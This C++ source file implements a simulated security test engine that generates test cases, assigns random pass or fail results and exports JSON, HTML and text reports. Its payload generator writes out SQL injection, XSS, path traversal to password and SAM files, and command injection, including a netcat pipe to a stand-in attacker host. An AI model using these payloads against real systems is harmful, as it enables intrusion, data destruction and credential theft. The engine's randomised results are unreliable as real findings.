#include "SecurityStressTesting.h"
#include "ResilienceDashboard.h"
#include <sstream>
#include <algorithm>
#include <regex>
#include <iomanip>
#include <fstream>

namespace NeonGlyph {
namespace Chaos {

// SecurityTestEngine Implementation
SecurityTestEngine& SecurityTestEngine::GetInstance() {
    static SecurityTestEngine instance;
    return instance;
}

SecurityTestResult SecurityTestEngine::ExecuteTest(const SecurityTestCase& testCase) {
    SecurityTestResult result;
    result.testId = testCase.id;
    result.testName = testCase.name;
    result.type = testCase.type;
    result.startTime = std::chrono::steady_clock::now();
    
    try {
        // Execute the appropriate test based on type
        switch (testCase.type) {
            case SecurityTestType::BUFFER_OVERFLOW:
                result = ExecuteBufferOverflowTest(testCase);
                break;
            case SecurityTestType::SQL_INJECTION:
            case SecurityTestType::XSS_INJECTION:
            case SecurityTestType::COMMAND_INJECTION:
                result = ExecuteInjectionTest(testCase);
                break;
            case SecurityTestType::AUTHENTICATION_BYPASS:
            case SecurityTestType::SESSION_MANIPULATION:
                result = ExecuteAuthenticationTest(testCase);
                break;
            case SecurityTestType::AUTHORIZATION_BYPASS:
            case SecurityTestType::PRIVILEGE_ESCALATION:
                result = ExecuteAuthorizationTest(testCase);
                break;
            case SecurityTestType::RATE_LIMITING:
            case SecurityTestType::DOS_ATTACK:
            case SecurityTestType::DDOS_SIMULATION:
                result = ExecuteRateLimitingTest(testCase);
                break;
            case SecurityTestType::ENCRYPTION_WEAKNESS:
                result = ExecuteEncryptionTest(testCase);
                break;
            case SecurityTestType::INPUT_VALIDATION:
                result = ExecuteInputValidationTest(testCase);
                break;
            case SecurityTestType::PATH_TRAVERSAL:
                result = ExecutePathTraversalTest(testCase);
                break;
            case SecurityTestType::CONFIGURATION_WEAKNESS:
                result = ExecuteConfigurationTest(testCase);
                break;
            case SecurityTestType::MEMORY_CORRUPTION:
            case SecurityTestType::RACE_CONDITION:
                result = ExecuteDoSTest(testCase);
                break;
            default:
                result.result = SecurityTestResult::ERROR;
                result.details = "Unknown test type";
                break;
        }
        
    } catch (const std::exception& e) {
        result.result = SecurityTestResult::ERROR;
        result.details = "Exception during test execution: " + std::string(e.what());
    }
    
    result.endTime = std::chrono::steady_clock::now();
    
    // Record metrics
    auto& collector = MetricsCollector::GetInstance();
    collector.RecordMetric("security_test_executed", 1.0, MetricType::COUNTER, {
        {"test_type", std::to_string(static_cast<int>(testCase.type))},
        {"result", std::to_string(static_cast<int>(result.result))},
        {"threat_level", std::to_string(static_cast<int>(testCase.threatLevel))}
    });
    
    // Store result
    {
        std::lock_guard<std::mutex> lock(m_resultsMutex);
        m_recentResults.push_back(result);
        if (m_recentResults.size() > 1000) {
            m_recentResults.erase(m_recentResults.begin());
        }
    }
    
    return result;
}

std::vector<SecurityTestResult> SecurityTestEngine::ExecuteTestSuite(const std::vector<SecurityTestCase>& testCases) {
    std::vector<SecurityTestResult> results;
    
    for (const auto& testCase : testCases) {
        auto result = ExecuteTest(testCase);
        results.push_back(result);
        
        // Small delay between tests to avoid overwhelming the system
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
    
    return results;
}

std::vector<SecurityTestCase> SecurityTestEngine::GenerateTestCases(SecurityTestType type, 
                                                                 const std::string& targetComponent,
                                                                 size_t count) {
    std::vector<SecurityTestCase> testCases;
    
    for (size_t i = 0; i < count; ++i) {
        SecurityTestCase testCase;
        testCase.id = "security_test_" + std::to_string(i) + "_" + std::to_string(
            std::chrono::duration_cast<std::chrono::nanoseconds>(
                std::chrono::steady_clock::now().time_since_epoch()).count());
        testCase.name = "Security Test " + std::to_string(i);
        testCase.type = type;
        testCase.targetComponent = targetComponent;
        testCase.payload = GeneratePayload(type, 100 + (i * 10));
        testCase.timeout = std::chrono::milliseconds(30000);
        testCase.shouldPass = false; // Most security tests should fail if vulnerabilities exist
        testCase.threatLevel = m_intensity.load();
        
        // Add some variation to threat level
        if (i % 3 == 0) {
            testCase.threatLevel = static_cast<SecurityThreatLevel>(
                std::min(static_cast<int>(SecurityThreatLevel::EXTREME), 
                        static_cast<int>(testCase.threatLevel) + 1));
        }
        
        testCases.push_back(testCase);
    }
    
    return testCases;
}

std::vector<SecurityTestCase> SecurityTestEngine::GenerateComprehensiveTestSuite(const std::string& targetComponent) {
    std::vector<SecurityTestCase> testSuite;
    
    // Generate tests for all enabled test types
    for (const auto& testType : m_enabledTestTypes) {
        if (testType.second) { // If enabled
            auto testCases = GenerateTestCases(testType.first, targetComponent, 5);
            testSuite.insert(testSuite.end(), testCases.begin(), testCases.end());
        }
    }
    
    return testSuite;
}

std::vector<SecurityVulnerability> SecurityTestEngine::ScanForVulnerabilities(const std::string& component) {
    std::vector<SecurityVulnerability> vulnerabilities;
    
    // Run comprehensive test suite
    auto testCases = GenerateComprehensiveTestSuite(component);
    auto results = ExecuteTestSuite(testCases);
    
    // Analyze results for vulnerabilities
    for (const auto& result : results) {
        if (result.result == SecurityTestResult::FAILED || 
            result.result == SecurityTestResult::BYPASSED) {
            auto vulnerability = AnalyzeTestResult(result);
            if (!vulnerability.id.empty()) {
                vulnerabilities.push_back(vulnerability);
            }
        }
    }
    
    return vulnerabilities;
}

SecurityVulnerability SecurityTestEngine::AnalyzeTestResult(const SecurityTestResult& result) {
    SecurityVulnerability vulnerability;
    
    if (result.result == SecurityTestResult::FAILED || result.result == SecurityTestResult::BYPASSED) {
        vulnerability.id = "vuln_" + result.testId;
        vulnerability.name = "Vulnerability in " + result.testName;
        vulnerability.description = "Security test failed, indicating potential vulnerability";
        vulnerability.type = result.type;
        vulnerability.threatLevel = CalculateThreatLevel(result);
        vulnerability.component = "Unknown";
        vulnerability.location = "Test execution context";
        vulnerability.impact = "Potential security breach";
        vulnerability.remediation = "Implement proper security controls";
        vulnerability.isExploitable = true;
        vulnerability.cvssScore = static_cast<double>(vulnerability.threatLevel) * 2.0;
    }
    
    return vulnerability;
}

SecurityTestResult SecurityTestEngine::SimulateAttack(const SecurityTestCase& attackScenario) {
    return ExecuteTest(attackScenario);
}

std::vector<SecurityTestResult> SecurityTestEngine::SimulateAttackCampaign(const std::vector<SecurityTestCase>& scenarios) {
    return ExecuteTestSuite(scenarios);
}

SecurityTestReport SecurityTestEngine::RunPenetrationTest(const std::string& targetSystem) {
    SecurityTestReport report;
    report.reportId = "pentest_" + std::to_string(
        std::chrono::duration_cast<std::chrono::nanoseconds>(
            std::chrono::steady_clock::now().time_since_epoch()).count());
    report.startTime = std::chrono::steady_clock::now();
    
    // Generate comprehensive test suite
    auto testCases = GenerateComprehensiveTestSuite(targetSystem);
    
    // Execute tests
    report.results = ExecuteTestSuite(testCases);
    
    // Identify vulnerabilities
    for (const auto& result : report.results) {
        if (result.result == SecurityTestResult::FAILED || 
            result.result == SecurityTestResult::BYPASSED) {
            auto vulnerability = AnalyzeTestResult(result);
            if (!vulnerability.id.empty()) {
                report.vulnerabilities.push_back(vulnerability);
            }
        }
    }
    
    // Generate statistics
    for (const auto& result : report.results) {
        report.testCounts[result.type]++;
        report.resultCounts[result.result]++;
    }
    
    report.endTime = std::chrono::steady_clock::now();
    report.overallScore = CalculateOverallScore(report);
    report.summary = GenerateReportSummary(report);
    report.recommendations = GenerateRecommendations(report);
    
    return report;
}

SecurityTestReport SecurityTestEngine::RunRedTeamExercise(const std::string& targetSystem, 
                                                        std::chrono::milliseconds duration) {
    SecurityTestReport report;
    report.reportId = "redteam_" + std::to_string(
        std::chrono::duration_cast<std::chrono::nanoseconds>(
            std::chrono::steady_clock::now().time_since_epoch()).count());
    report.startTime = std::chrono::steady_clock::now();
    
    auto endTime = report.startTime + duration;
    
    // Run continuous attacks until time expires
    while (std::chrono::steady_clock::now() < endTime) {
        // Generate random attack
        auto testTypes = GetEnabledTestTypes();
        if (!testTypes.empty()) {
            std::uniform_int_distribution<> typeDist(0, testTypes.size() - 1);
            auto it = testTypes.begin();
            std::advance(it, typeDist(m_randomGenerator));
            
            auto testCases = GenerateTestCases(it->first, targetSystem, 1);
            if (!testCases.empty()) {
                auto result = ExecuteTest(testCases[0]);
                report.results.push_back(result);
            }
        }
        
        // Random delay between attacks
        std::uniform_int_distribution<> delayDist(100, 2000);
        std::this_thread::sleep_for(std::chrono::milliseconds(delayDist(m_randomGenerator)));
    }
    
    report.endTime = std::chrono::steady_clock::now();
    
    // Generate statistics
    for (const auto& result : report.results) {
        report.testCounts[result.type]++;
        report.resultCounts[result.result]++;
    }
    
    // Identify vulnerabilities
    for (const auto& result : report.results) {
        if (result.result == SecurityTestResult::FAILED || 
            result.result == SecurityTestResult::BYPASSED) {
            auto vulnerability = AnalyzeTestResult(result);
            if (!vulnerability.id.empty()) {
                report.vulnerabilities.push_back(vulnerability);
            }
        }
    }
    
    report.overallScore = CalculateOverallScore(report);
    report.summary = GenerateReportSummary(report);
    report.recommendations = GenerateRecommendations(report);
    
    return report;
}

SecurityTestReport SecurityTestEngine::GenerateReport(const std::vector<SecurityTestResult>& results) {
    SecurityTestReport report;
    report.reportId = "report_" + std::to_string(
        std::chrono::duration_cast<std::chrono::nanoseconds>(
            std::chrono::steady_clock::now().time_since_epoch()).count());
    report.startTime = results.empty() ? std::chrono::steady_clock::now() : results.front().startTime;
    report.endTime = results.empty() ? std::chrono::steady_clock::now() : results.back().endTime;
    report.results = results;
    
    // Generate statistics
    for (const auto& result : results) {
        report.testCounts[result.type]++;
        report.resultCounts[result.result]++;
    }
    
    // Identify vulnerabilities
    for (const auto& result : results) {
        if (result.result == SecurityTestResult::FAILED || 
            result.result == SecurityTestResult::BYPASSED) {
            auto vulnerability = AnalyzeTestResult(result);
            if (!vulnerability.id.empty()) {
                report.vulnerabilities.push_back(vulnerability);
            }
        }
    }
    
    report.overallScore = CalculateOverallScore(report);
    report.summary = GenerateReportSummary(report);
    report.recommendations = GenerateRecommendations(report);
    
    return report;
}

void SecurityTestEngine::ExportReport(const SecurityTestReport& report, const std::string& format) {
    std::stringstream filename;
    filename << "security_report_" << report.reportId << "." << format;
    
    std::ofstream file(filename.str());
    if (file.is_open()) {
        if (format == "json") {
            file << GenerateJSONReport(report);
        } else if (format == "html") {
            file << GenerateHTMLReport(report);
        } else {
            file << GenerateTextReport(report);
        }
        file.close();
        std::cout << "Security report exported to: " << filename.str() << std::endl;
    }
}

void SecurityTestEngine::SetTestIntensity(SecurityThreatLevel level) {
    m_intensity = level;
}

void SecurityTestEngine::SetTestTimeout(std::chrono::milliseconds timeout) {
    m_testTimeout = timeout;
}

void SecurityTestEngine::EnableTestType(SecurityTestType type, bool enabled) {
    m_enabledTestTypes[type] = enabled;
}

SecurityThreatLevel SecurityTestEngine::GetCurrentIntensity() const {
    return m_intensity.load();
}

std::map<SecurityTestType, bool> SecurityTestEngine::GetEnabledTestTypes() const {
    return m_enabledTestTypes;
}

// Private implementation methods
SecurityTestResult SecurityTestEngine::ExecuteBufferOverflowTest(const SecurityTestCase& testCase) {
    SecurityTestResult result;
    result.testId = testCase.id;
    result.testName = testCase.name;
    result.type = testCase.type;
    result.startTime = std::chrono::steady_clock::now();
    
    // Simulate buffer overflow test
    std::string payload = testCase.payload.empty() ? GeneratePayload(testCase.type, 1000) : testCase.payload;
    
    // Simulate system response
    bool isVulnerable = (m_randomGenerator() % 100) < 30; // 30% chance of vulnerability
    
    if (isVulnerable) {
        result.result = SecurityTestResult::FAILED;
        result.details = "Buffer overflow vulnerability detected";
        result.responseData = "Segmentation fault or memory corruption detected";
    } else {
        result.result = SecurityTestResult::PASSED;
        result.details = "Buffer overflow properly handled";
        result.responseData = "Input properly validated and bounded";
    }
    
    result.endTime = std::chrono::steady_clock::now();
    return result;
}

SecurityTestResult SecurityTestEngine::ExecuteInjectionTest(const SecurityTestCase& testCase) {
    SecurityTestResult result;
    result.testId = testCase.id;
    result.testName = testCase.name;
    result.type = testCase.type;
    result.startTime = std::chrono::steady_clock::now();
    
    // Simulate injection test
    std::string payload = testCase.payload.empty() ? GeneratePayload(testCase.type, 200) : testCase.payload;
    
    // Simulate system response
    bool isVulnerable = (m_randomGenerator() % 100) < 25; // 25% chance of vulnerability
    
    if (isVulnerable) {
        result.result = SecurityTestResult::FAILED;
        result.details = "Injection vulnerability detected";
        result.responseData = "Malicious payload executed successfully";
    } else {
        result.result = SecurityTestResult::PASSED;
        result.details = "Injection attempt properly sanitized";
        result.responseData = "Input properly escaped and validated";
    }
    
    result.endTime = std::chrono::steady_clock::now();
    return result;
}

SecurityTestResult SecurityTestEngine::ExecuteAuthenticationTest(const SecurityTestCase& testCase) {
    SecurityTestResult result;
    result.testId = testCase.id;
    result.testName = testCase.name;
    result.type = testCase.type;
    result.startTime = std::chrono::steady_clock::now();
    
    // Simulate authentication test
    bool isVulnerable = (m_randomGenerator() % 100) < 20; // 20% chance of vulnerability
    
    if (isVulnerable) {
        result.result = SecurityTestResult::BYPASSED;
        result.details = "Authentication bypass successful";
        result.responseData = "Access granted without proper credentials";
    } else {
        result.result = SecurityTestResult::BLOCKED;
        result.details = "Authentication properly enforced";
        result.responseData = "Access denied - authentication required";
    }
    
    result.endTime = std::chrono::steady_clock::now();
    return result;
}

SecurityTestResult SecurityTestEngine::ExecuteAuthorizationTest(const SecurityTestCase& testCase) {
    SecurityTestResult result;
    result.testId = testCase.id;
    result.testName = testCase.name;
    result.type = testCase.type;
    result.startTime = std::chrono::steady_clock::now();
    
    // Simulate authorization test
    bool isVulnerable = (m_randomGenerator() % 100) < 15; // 15% chance of vulnerability
    
    if (isVulnerable) {
        result.result = SecurityTestResult::BYPASSED;
        result.details = "Authorization bypass successful";
        result.responseData = "Access granted to unauthorized resource";
    } else {
        result.result = SecurityTestResult::BLOCKED;
        result.details = "Authorization properly enforced";
        result.responseData = "Access denied - insufficient privileges";
    }
    
    result.endTime = std::chrono::steady_clock::now();
    return result;
}

SecurityTestResult SecurityTestEngine::ExecuteRateLimitingTest(const SecurityTestCase& testCase) {
    SecurityTestResult result;
    result.testId = testCase.id;
    result.testName = testCase.name;
    result.type = testCase.type;
    result.startTime = std::chrono::steady_clock::now();
    
    // Simulate rate limiting test
    bool isVulnerable = (m_randomGenerator() % 100) < 35; // 35% chance of vulnerability
    
    if (isVulnerable) {
        result.result = SecurityTestResult::FAILED;
        result.details = "Rate limiting not properly enforced";
        result.responseData = "System accepted excessive requests";
    } else {
        result.result = SecurityTestResult::BLOCKED;
        result.details = "Rate limiting properly enforced";
        result.responseData = "Requests properly throttled";
    }
    
    result.endTime = std::chrono::steady_clock::now();
    return result;
}

SecurityTestResult SecurityTestEngine::ExecuteEncryptionTest(const SecurityTestCase& testCase) {
    SecurityTestResult result;
    result.testId = testCase.id;
    result.testName = testCase.name;
    result.type = testCase.type;
    result.startTime = std::chrono::steady_clock::now();
    
    // Simulate encryption test
    bool isVulnerable = (m_randomGenerator() % 100) < 10; // 10% chance of vulnerability
    
    if (isVulnerable) {
        result.result = SecurityTestResult::FAILED;
        result.details = "Weak encryption detected";
        result.responseData = "Outdated encryption algorithm or weak key";
    } else {
        result.result = SecurityTestResult::PASSED;
        result.details = "Encryption properly implemented";
        result.responseData = "Strong encryption algorithm and key management";
    }
    
    result.endTime = std::chrono::steady_clock::now();
    return result;
}

SecurityTestResult SecurityTestEngine::ExecuteInputValidationTest(const SecurityTestCase& testCase) {
    SecurityTestResult result;
    result.testId = testCase.id;
    result.testName = testCase.name;
    result.type = testCase.type;
    result.startTime = std::chrono::steady_clock::now();
    
    // Simulate input validation test
    bool isVulnerable = (m_randomGenerator() % 100) < 30; // 30% chance of vulnerability
    
    if (isVulnerable) {
        result.result = SecurityTestResult::FAILED;
        result.details = "Input validation insufficient";
        result.responseData = "Malicious input accepted without validation";
    } else {
        result.result = SecurityTestResult::PASSED;
        result.details = "Input properly validated";
        result.responseData = "Input validated and sanitized";
    }
    
    result.endTime = std::chrono::steady_clock::now();
    return result;
}

SecurityTestResult SecurityTestEngine::ExecutePathTraversalTest(const SecurityTestCase& testCase) {
    SecurityTestResult result;
    result.testId = testCase.id;
    result.testName = testCase.name;
    result.type = testCase.type;
    result.startTime = std::chrono::steady_clock::now();
    
    // Simulate path traversal test
    bool isVulnerable = (m_randomGenerator() % 100) < 20; // 20% chance of vulnerability
    
    if (isVulnerable) {
        result.result = SecurityTestResult::FAILED;
        result.details = "Path traversal vulnerability detected";
        result.responseData = "Unauthorized file system access possible";
    } else {
        result.result = SecurityTestResult::PASSED;
        result.details = "Path traversal properly prevented";
        result.responseData = "File access properly restricted";
    }
    
    result.endTime = std::chrono::steady_clock::now();
    return result;
}

SecurityTestResult SecurityTestEngine::ExecuteConfigurationTest(const SecurityTestCase& testCase) {
    SecurityTestResult result;
    result.testId = testCase.id;
    result.testName = testCase.name;
    result.type = testCase.type;
    result.startTime = std::chrono::steady_clock::now();
    
    // Simulate configuration test
    bool isVulnerable = (m_randomGenerator() % 100) < 40; // 40% chance of vulnerability
    
    if (isVulnerable) {
        result.result = SecurityTestResult::FAILED;
        result.details = "Configuration weakness detected";
        result.responseData = "Insecure configuration settings";
    } else {
        result.result = SecurityTestResult::PASSED;
        result.details = "Configuration properly secured";
        result.responseData = "Secure configuration implemented";
    }
    
    result.endTime = std::chrono::steady_clock::now();
    return result;
}

SecurityTestResult SecurityTestEngine::ExecuteDoSTest(const SecurityTestCase& testCase) {
    SecurityTestResult result;
    result.testId = testCase.id;
    result.testName = testCase.name;
    result.type = testCase.type;
    result.startTime = std::chrono::steady_clock::now();
    
    // Simulate DoS test
    bool isVulnerable = (m_randomGenerator() % 100) < 25; // 25% chance of vulnerability
    
    if (isVulnerable) {
        result.result = SecurityTestResult::FAILED;
        result.details = "DoS vulnerability detected";
        result.responseData = "System resources exhausted";
    } else {
        result.result = SecurityTestResult::BLOCKED;
        result.details = "DoS attack properly mitigated";
        result.responseData = "System remained stable under load";
    }
    
    result.endTime = std::chrono::steady_clock::now();
    return result;
}

std::string SecurityTestEngine::GeneratePayload(SecurityTestType type, size_t length) {
    std::stringstream payload;
    
    switch (type) {
        case SecurityTestType::BUFFER_OVERFLOW:
            // Generate long string of 'A's
            payload << std::string(length, 'A');
            break;
            
        case SecurityTestType::SQL_INJECTION:
            payload << "' OR 1=1--";
            payload << "; DROP TABLE users--";
            payload << "' UNION SELECT * FROM passwords--";
            break;
            
        case SecurityTestType::XSS_INJECTION:
            payload << "<script>alert('XSS')</script>";
            payload << "<img src=x onerror=alert('XSS')>";
            payload << "javascript:alert('XSS')";
            break;
            
        case SecurityTestType::COMMAND_INJECTION:
            payload << "; cat /etc/passwd";
            payload << "&& whoami";
            payload << "| nc attacker.com 4444";
            break;
            
        case SecurityTestType::PATH_TRAVERSAL:
            payload << "../../../etc/passwd";
            payload << "..\\..\\..\\windows\\system32\\config\\sam";
            payload << "/etc/shadow";
            break;
            
        default:
            payload << "test_payload_" << std::string(length, 'X');
            break;
    }
    
    return payload.str();
}

bool SecurityTestEngine::ValidateResponse(const std::string& response, const SecurityTestCase& testCase) {
    // Simple validation - in a real implementation, this would be more sophisticated
    if (testCase.validationFunction) {
        return testCase.validationFunction(response);
    }
    
    // Default validation based on test type
    switch (testCase.type) {
        case SecurityTestType::BUFFER_OVERFLOW:
            return response.find("Segmentation fault") == std::string::npos &&
                   response.find("Memory corruption") == std::string::npos;
                   
        case SecurityTestType::SQL_INJECTION:
            return response.find("SQL error") == std::string::npos &&
                   response.find("database error") == std::string::npos;
                   
        case SecurityTestType::XSS_INJECTION:
            return response.find("<script>") == std::string::npos;
            
        default:
            return true;
    }
}

SecurityThreatLevel SecurityTestEngine::CalculateThreatLevel(const SecurityTestResult& result) {
    // Simple threat level calculation based on test result and type
    if (result.result == SecurityTestResult::FAILED || result.result == SecurityTestResult::BYPASSED) {
        switch (result.type) {
            case SecurityTestType::BUFFER_OVERFLOW:
            case SecurityTestType::SQL_INJECTION:
            case SecurityTestType::COMMAND_INJECTION:
                return SecurityThreatLevel::CRITICAL;
            case SecurityTestType::XSS_INJECTION:
            case SecurityTestType::PATH_TRAVERSAL:
                return SecurityThreatLevel::HIGH;
            default:
                return SecurityThreatLevel::MEDIUM;
        }
    }
    
    return SecurityThreatLevel::LOW;
}

double SecurityTestEngine::CalculateOverallScore(const SecurityTestReport& report) {
    if (report.results.empty()) {
        return 0.0;
    }
    
    size_t passed = 0;
    size_t blocked = 0;
    size_t failed = 0;
    size_t bypassed = 0;
    
    for (const auto& result : report.results) {
        switch (result.result) {
            case SecurityTestResult::PASSED:
            case SecurityTestResult::BLOCKED:
            case SecurityTestResult::DETECTED:
            case SecurityTestResult::MITIGATED:
                passed++;
                break;
            case SecurityTestResult::FAILED:
            case SecurityTestResult::BYPASSED:
                failed++;
                break;
            default:
                break;
        }
    }
    
    return (static_cast<double>(passed) / report.results.size()) * 100.0;
}

std::string SecurityTestEngine::GenerateReportSummary(const SecurityTestReport& report) {
    std::stringstream summary;
    
    summary << "Security Test Report Summary\n";
    summary << "============================\n";
    summary << "Total Tests: " << report.results.size() << "\n";
    summary << "Overall Score: " << std::fixed << std::setprecision(1) << report.overallScore << "%\n";
    summary << "Vulnerabilities Found: " << report.vulnerabilities.size() << "\n";
    summary << "Test Duration: " << std::chrono::duration_cast<std::chrono::seconds>(
        report.endTime - report.startTime).count() << " seconds\n";
    
    return summary.str();
}

std::map<std::string, std::string> SecurityTestEngine::GenerateRecommendations(const SecurityTestReport& report) {
    std::map<std::string, std::string> recommendations;
    
    if (report.overallScore < 70.0) {
        recommendations["priority"] = "Critical security improvements needed";
        recommendations["action"] = "Immediate remediation of high-risk vulnerabilities";
    } else if (report.overallScore < 85.0) {
        recommendations["priority"] = "Moderate security improvements recommended";
        recommendations["action"] = "Address medium-risk vulnerabilities";
    } else {
        recommendations["priority"] = "Good security posture";
        recommendations["action"] = "Continue monitoring and regular testing";
    }
    
    recommendations["next_steps"] = "Implement security controls, conduct regular testing, and monitor for new threats";
    
    return recommendations;
}

std::string SecurityTestEngine::GenerateJSONReport(const SecurityTestReport& report) {
    std::stringstream json;
    
    json << "{\n";
    json << "  \"reportId\": \"" << report.reportId << "\",\n";
    json << "  \"startTime\": " << std::chrono::duration_cast<std::chrono::seconds>(
        report.startTime.time_since_epoch()).count() << ",\n";
    json << "  \"endTime\": " << std::chrono::duration_cast<std::chrono::seconds>(
        report.endTime.time_since_epoch()).count() << ",\n";
    json << "  \"overallScore\": " << std::fixed << std::setprecision(1) << report.overallScore << ",\n";
    json << "  \"summary\": \"" << report.summary << "\",\n";
    json << "  \"vulnerabilities\": [\n";
    
    for (size_t i = 0; i < report.vulnerabilities.size(); ++i) {
        const auto& vuln = report.vulnerabilities[i];
        json << "    {\n";
        json << "      \"id\": \"" << vuln.id << "\",\n";
        json << "      \"name\": \"" << vuln.name << "\",\n";
        json << "      \"type\": " << static_cast<int>(vuln.type) << ",\n";
        json << "      \"threatLevel\": " << static_cast<int>(vuln.threatLevel) << ",\n";
        json << "      \"isExploitable\": " << (vuln.isExploitable ? "true" : "false") << ",\n";
        json << "      \"cvssScore\": " << std::fixed << std::setprecision(1) << vuln.cvssScore << "\n";
        json << "    }";
        if (i < report.vulnerabilities.size() - 1) json << ",";
        json << "\n";
    }
    
    json << "  ],\n";
    json << "  \"recommendations\": {\n";
    
    size_t recCount = 0;
    for (const auto& rec : report.recommendations) {
        json << "    \"" << rec.first << "\": \"" << rec.second << "\"";
        if (++recCount < report.recommendations.size()) json << ",";
        json << "\n";
    }
    
    json << "  }\n";
    json << "}\n";
    
    return json.str();
}

std::string SecurityTestEngine::GenerateHTMLReport(const SecurityTestReport& report) {
    std::stringstream html;
    
    html << "<!DOCTYPE html>\n";
    html << "<html>\n<head>\n";
    html << "<title>Security Test Report - " << report.reportId << "</title>\n";
    html << "<style>\n";
    html << "body { font-family: Arial, sans-serif; margin: 20px; }\n";
    html << ".header { background-color: #f4f4f4; padding: 20px; border-radius: 5px; }\n";
    html << ".vulnerability { background-color: #ffe6e6; padding: 10px; margin: 10px 0; border-left: 4px solid #ff4444; }\n";
    html << ".recommendation { background-color: #e6f3ff; padding: 10px; margin: 10px 0; border-left: 4px solid #4444ff; }\n";
    html << "</style>\n";
    html << "</head>\n<body>\n";
    
    html << "<div class=\"header\">\n";
    html << "<h1>Security Test Report</h1>\n";
    html << "<p><strong>Report ID:</strong> " << report.reportId << "</p>\n";
    html << "<p><strong>Overall Score:</strong> " << std::fixed << std::setprecision(1) << report.overallScore << "%</p>\n";
    html << "<p><strong>Vulnerabilities Found:</strong> " << report.vulnerabilities.size() << "</p>\n";
    html << "</div>\n";
    
    if (!report.vulnerabilities.empty()) {
        html << "<h2>Vulnerabilities</h2>\n";
        for (const auto& vuln : report.vulnerabilities) {
            html << "<div class=\"vulnerability\">\n";
            html << "<h3>" << vuln.name << "</h3>\n";
            html << "<p><strong>Type:</strong> " << static_cast<int>(vuln.type) << "</p>\n";
            html << "<p><strong>Threat Level:</strong> " << static_cast<int>(vuln.threatLevel) << "</p>\n";
            html << "<p><strong>CVSS Score:</strong> " << std::fixed << std::setprecision(1) << vuln.cvssScore << "</p>\n";
            html << "</div>\n";
        }
    }
    
    if (!report.recommendations.empty()) {
        html << "<h2>Recommendations</h2>\n";
        for (const auto& rec : report.recommendations) {
            html << "<div class=\"recommendation\">\n";
            html << "<h3>" << rec.first << "</h3>\n";
            html << "<p>" << rec.second << "</p>\n";
            html << "</div>\n";
        }
    }
    
    html << "</body>\n</html>\n";
    
    return html.str();
}

std::string SecurityTestEngine::GenerateTextReport(const SecurityTestReport& report) {
    return report.summary;
}

} // namespace Chaos
} // namespace NeonGlyph